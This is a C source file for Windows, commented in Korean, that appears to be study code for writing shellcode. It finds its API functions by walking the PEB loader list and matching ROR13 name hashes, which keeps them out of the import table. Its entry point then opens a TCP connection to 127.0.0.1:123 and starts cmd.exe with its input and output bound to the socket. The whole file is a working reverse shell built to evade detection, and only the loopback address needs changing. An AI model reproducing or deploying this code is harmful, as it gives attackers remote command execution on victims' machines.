#include <WinSock2.h> // must preceed #include <windows.h>
#include <WS2tcpip.h>
#include <windows.h>
#include <winnt.h>
#include <winternl.h>
#include <stddef.h>
#include <stdio.h>

// short intger(일반적으로 2byte) 데이터를 네트워크 byte order로 변경한다.
#define htons(A) ((((WORD)(A) & 0xff00) >> 8) | (((WORD)(A) & 0x00ff) << 8))

// PEB (Process Environment Block) : TEB와 비슷하게 실행 중인 프로세스에 대한 정보를 담아두는 구조체
// TEB(Thread Environment Block) : 현재 실행되고 있는 쓰레드에 대한 정보를 담고 있는 구조체
// FS+0x30=> PEB 주소
_inline PEB* getPEB() {
	PEB* p;
	__asm {
		mov eax, fs: [30h]
		mov p, eax
	}
	return p;
}

DWORD getHash(const char* str) {
	DWORD h = 0;
	while (*str) {
		h = (h >> 13) | (h << (32 - 13)); // ROR h, 13
		h += *str >= 'a' ? *str - 32 : *str; // 문자를 대문자로 변환
		str++;
	}
	return h;
}


DWORD getFunctionHash(const char* moduleName, const char* functionName) {
	return getHash(moduleName) + getHash(functionName);
}

// PEB-> LDR -> _PEB_LDR_DATA
LDR_DATA_TABLE_ENTRY* getDataTableEntry(const LIST_ENTRY* ptr) {
    /*
    // InMemoryOrderLinks
    ->  실행 파일 그자체에 대한 정보가 담겨 있다.
    -> FLink를 따라가 보면 로드된 라이브러인 ntdll.dll 파일의 정보가 들어 있는 두 번째 LDR_DATA_TABLE_ENTRY 구조체를 만날 수 있다.
    -> 한번 더 FLINK를 따라가 보면 두 번 째 로드된 라이브러리이며 kernel32.dll 파일의 정보가 들어 있는 LDR_DATA_TABLE_ENTRY 구조체를 만날 수 있다.
    */
    // #define‬ offsetof(TYPE, MEMBER) ((sizet) &((TYPE *)0)->MEMBER) -> 구조체 멤버의 오프셋을 반환함 (size_t casting)
	int list_entry_offset = offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
	return (LDR_DATA_TABLE_ENTRY*)((BYTE*)ptr - list_entry_offset);
}

// 해당 기능은 forwarders에서는 작동하지 않는다. 예를들어 kernel32.ExitThread는 ntdll.RtlExitUserThread 로 전달된다.
// PVOID (void *)
// https://reversecore.com/24
PVOID getProcAddrByHash(DWORD hash) {
	PEB* peb = getPEB(); // peb 주소 값
	// Double Link list (Flink->Flink)
	LIST_ENTRY* first = peb->Ldr->InMemoryOrderModuleList.Flink; // TEB+0x30->PEB+0xC->LDR->InMemoryOrderModuleList.Flink
	LIST_ENTRY* ptr = first;

	do { // for each module
		LDR_DATA_TABLE_ENTRY* dte = getDataTableEntry(ptr); // Data Table Entry Struct base address 
		ptr = ptr->Flink;
		BYTE* baseAddress = (BYTE*)dte->DllBase;
		if (!baseAddress) // invalid module(???)
			continue;
		IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
		IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(baseAddress + dosHeader->e_lfanew); // IMAGE_DOS_HEADER.e_lfanew => NT HEADER 가 시작되는 오프셋
		// IMAGE_EXPORT_DIRECTORY = IMAGE_OPTIONAL_HEADER32.DataDirecotry[0].VirutalAddress
		DWORD iedRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
		if (!iedRVA) // Export Directory not present -> Export Directory => DLL 들의 파일에서 외부에서 함수를 공개하기 위한 정보
			continue;
		IMAGE_EXPORT_DIRECTORY* ied = (IMAGE_EXPORT_DIRECTORY*)(baseAddress + iedRVA); // IMAGE_EXPORT_DIRECTORY(RVA) + Kenerl32.dll -> real IED
		char* moduleName = (char*)(baseAddress + ied->Name); // IED->Name => address of library file name
		DWORD moduleHash = getHash(moduleName); // dll name
/* _IMAGE_EXPORT_DIRECTORY
NumberOfFunctions : 실제 export 함수 갯수
NumberOfNames : export 함수중에서 이름을 가지는 함수 갯수 (<=NumberOfFunctios)
AddressOfFunctions : export 함수들의 시작 위치 배열의 주소 (배열의 원소 개수 = NumberOfFunctions)
AddressOfNames : 함수 이름 배열의 주소 (배열의 원소 개수 = NumberofNames)
AddressOfOrdinals : ordinal 배열의 주소 (배열의 원소 개수 = NumberOfNames)

AddressOfNames 및 AddressOfNameOrdinals가 가리키는 배열은 병렬로 실행된다.
두 배열의 요소는 동일한 함수를 참조한다. 첫 번째 배열은 이름을 지정하는 반면 
두 번째는 서수이다. 이 서수는 다음이 가리키는 배열의 인덱스로 사용할 수 있다.
AddressOfFunctions는 함수의 진입접을 찾는다.
*/

		// RVA real function name
		DWORD* nameRVAs = (DWORD*)(baseAddress + ied->AddressOfNames);
		for (DWORD i = 0; i < ied->NumberOfNames; ++i) {
			char* functionName = (char*)(baseAddress + nameRVAs[i]);
			if (hash == moduleHash + getHash(functionName)) {
				WORD ordinal = ((WORD*)(baseAddress + ied->AddressOfNameOrdinals))[i];
				DWORD functionRVA = ((DWORD*)(baseAddress + ied->AddressOfFunctions))[ordinal];
				return baseAddress + functionRVA;
			}
		}
	} while (ptr != first);
	return NULL; // address not found
}
// network area
#define HASH_LoadLibraryA 0xf8b7108d
#define HASH_WSAStartup 0x2ddcd540
#define HASH_WSACleanup 0x0b9d13bc
#define HASH_WSASocketA 0x9fd4f16f
#define HASH_WSAConnect 0xa50da182
#define HASH_CreateProcessA 0x231cbe70
#define HASH_inet_ntoa 0x1b73fed1
#define HASH_inet_addr 0x011bfae2
#define HASH_getaddrinfo 0xdc2953c9
#define HASH_getnameinfo 0x5c1c856e
#define HASH_ExitThread 0x4b3153e0
#define HASH_WaitForSingleObject 0xca8e9498
#define DefineFuncPtr(name) decltype(name) *My_##name = (decltype(name) *)getProcAddrByHash(HASH_##name)
int entryPoint() {
	// printf("0x%08x\n", getFunctionHash("kernel32.dll", "WaitForSingleObject"));
	// return 0;
	// NOTE: we should call WSACleanup() and freeaddrinfo() (after getaddrinfo()), but
	// they're not strictly needed.
	DefineFuncPtr(LoadLibraryA);
	My_LoadLibraryA("ws2_32.dll");
	DefineFuncPtr(WSAStartup);
	DefineFuncPtr(WSASocketA);
	DefineFuncPtr(WSAConnect);
	DefineFuncPtr(CreateProcessA);
	DefineFuncPtr(inet_ntoa); // no used
	DefineFuncPtr(inet_addr);
	DefineFuncPtr(getaddrinfo);
	DefineFuncPtr(getnameinfo);
	DefineFuncPtr(ExitThread);
	DefineFuncPtr(WaitForSingleObject);
	const char* hostName = "127.0.0.1";
	const int hostPort = 123;
	WSADATA wsaData;
	if (My_WSAStartup(MAKEWORD(2, 2), &wsaData))
		goto __end; // error
	{
		SOCKET sock = My_WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

		if (sock == INVALID_SOCKET)
			goto __end;
		addrinfo* result;
		if (My_getaddrinfo(hostName, NULL, NULL, &result))
			goto __end;
		char ip_addr[16];
		My_getnameinfo(result->ai_addr, result->ai_addrlen, ip_addr, sizeof(ip_addr), NULL, 0, NI_NUMERICHOST);
		SOCKADDR_IN remoteAddr;
		remoteAddr.sin_family = AF_INET;
		remoteAddr.sin_port = htons(hostPort);
		remoteAddr.sin_addr.s_addr = My_inet_addr(ip_addr);
		if (My_WSAConnect(sock, (SOCKADDR*)&remoteAddr, sizeof(remoteAddr), NULL, NULL, NULL, NULL))
			goto __end;
		STARTUPINFOA sInfo;
		PROCESS_INFORMATION procInfo;
		SecureZeroMemory(&sInfo, sizeof(sInfo)); // avoids a call to _memset
		sInfo.cb = sizeof(sInfo);
		sInfo.dwFlags = STARTF_USESTDHANDLES;
		sInfo.hStdInput = sInfo.hStdOutput = sInfo.hStdError = (HANDLE)sock;
		My_CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sInfo, &procInfo);
		// Waits for the process to finish.
		My_WaitForSingleObject(procInfo.hProcess, INFINITE);
	}
__end:
	My_ExitThread(0);
	return 0;
}
int main() {
	return entryPoint();
}